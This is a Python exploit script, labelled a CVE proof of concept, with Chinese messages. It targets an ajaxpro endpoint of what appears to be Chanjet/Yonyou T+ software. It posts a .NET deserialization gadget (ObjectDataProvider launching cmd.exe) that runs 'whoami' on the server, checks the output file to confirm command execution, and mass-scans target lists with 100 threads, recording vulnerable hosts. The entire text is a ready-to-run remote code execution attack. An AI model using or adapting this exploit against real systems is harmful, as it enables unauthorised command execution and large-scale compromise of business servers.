import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "X-Ajaxpro-Method": "GetStoreWarehouseByStore", "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2", "Connection": "keep-alive", "Content-type": "application/x-www-form-urlencoded"}
def poc(target):
    url_payload = '/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore'
    url = target+url_payload
    data = '''
    {
    "storeID": {
                "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", 
                "MethodName": "Start", 
                "ObjectInstance": {
                    "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", 
                    "StartInfo": {
                        "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", 
                        "Arguments": "/c whoami > test.txt", 
                        "FileName": "cmd"
                        }
                    }
                }
            }
    '''
    res1 = requests.get(target,verify=False)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=headers,data=data,verify=False)
        if 'actorId或archivesId不能为空' in res2.text or '获取数据源出错，不存在的数据源' in res2.text:
            res3 = requests.get(url=target+'/tplus/test.txt',verify=False)
            if res3.status_code==200:
                print(f'[+]{target}存在命令执行')
                with open('result.txt','a') as f:
                    f.write(target+'\n')
        else:
            print(f'[-]{target}不存在命令执行')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
def main():
    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()